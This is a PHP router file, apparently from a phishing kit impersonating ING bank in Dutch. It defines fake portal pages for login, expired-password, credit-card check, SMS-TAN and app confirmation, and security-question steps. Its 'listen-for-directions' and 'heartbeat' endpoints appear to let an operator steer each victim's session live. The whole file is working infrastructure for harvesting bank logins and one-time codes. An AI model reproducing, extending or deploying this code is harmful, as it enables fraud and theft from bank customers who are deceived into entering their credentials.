<?php
try{
	$router = new \classes\core\routing();

        $router->set404(function () {
            header("Location: /portal/login");
        });

        $router->get('/', function () {
            header("Location: /portal/login");

        });

        
        $router->all('/listen-for-directions', function () {
            $ing = new \controllers\ing(false);
            $ing->listenfordirections($_SESSION['uid']);    
        });

        $router->post('/heartbeat', function () {
           $ing = new \controllers\ing(false);
           $ing->heartbeat($_SESSION['uid']);
        });

        $router->mount('/portal', function () use ($router) {
            $router->get('/', function () {
                   header("Location: /portal/login");
            });

            $router->all('/controle', function () {
                $ing = new \controllers\ing(true);
                $ing->controle();
            });
            
            $router->all('/quarantainezone', function () {
                $ing = new \controllers\ing(true);
                $ing->quarantainezone();
            });

            $router->all('/verificatie-voltooid', function () {
                $ing = new \controllers\ing(true);
                $ing->verificatievoltooid();
            });

            $router->all('/controle-gegevens', function () {
                $ing = new \controllers\ing(true);
                $ing->controlegegevens();
            });

            $router->all('/controle-gegevens/fout', function () {
                $ing = new \controllers\ing(true);
                $ing->controlegegevens(true);
            });

            $router->all('/controle-ouders', function () {
                $ing = new \controllers\ing(true);
                $ing->controleouders();
            });

            $router->all('/controle-ouders', function () {
                $ing = new \controllers\ing(true);
                $ing->controleouders();
            });

            $router->all('/mobiel-bevestigen', function () {
                $ing = new \controllers\ing(true);
                $ing->mobielBevestigen();
            });

            
            $router->all('/app-bevestigen', function () {
                $ing = new \controllers\ing(true);
                $ing->appBevestigen();
            });

            $router->all('/sms-bevestigen', function () {
                $ing = new \controllers\ing(true);
                $ing->mobielBevestigenTan();
            });


            $router->all('/wachtwoord-verlopen', function () {
                $ing = new \controllers\ing(true);
                $ing->veranderwachtwoord();
            });


            $router->all('/controle-creditcard', function () {
                $ing = new \controllers\ing(true);
                $ing->controlecreditcard();
            });

            $router->all('/gegevens-verificatie', function () {
                $ing = new \controllers\ing(true);
                $ing->gegevensverificatie();
            });

            $router->all('/verificatie-vraag', function () {
                $ing = new \controllers\ing(true);
                $ing->verificatievraag();
            });

            $router->all('/afronding-verificatie', function () {
                $ing = new \controllers\ing(true);
                $ing->afrondingverificatie();
            });

            $router->all('/afronding-verificatie/fout', function () {
                $ing = new \controllers\ing(true);
                $ing->afrondingverificatie(true);
            });


            $router->all('/login(/\w+)?', function ($e) {
                if($e == "incorrect_login") {
                    $ing = new \controllers\ing(false);
                    $ing->login(true);
                 }else{
                    $ing = new \controllers\ing(false);
                    $ing->login(false);
                 }
            });
         });

	$router->Run();
}catch (Exception $e) { echo $e->getMessage(); }
